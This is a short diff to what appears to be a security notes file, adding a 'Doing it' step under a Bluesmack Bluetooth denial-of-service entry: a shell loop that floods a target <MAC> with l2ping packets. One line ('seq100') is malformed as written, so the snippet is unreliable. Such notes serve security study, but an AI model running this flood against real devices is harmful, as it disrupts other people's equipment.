@@ -115,6 +115,10 @@ Bluesmack -> DOS attack (Software l2cap)
 https://trifinite.org/trifinite_stuff_bluesmack.html
 https://computersecuritypgp.blogspot.de/2016/02/what-is-bluesmack-attack.html
 
+Doing it:
+seq100>numberofscans
+while read r; do l2ping -s 100 <MAC>; done <numberofscans
+
 Honeypots
 ~~~~~~~~~
 
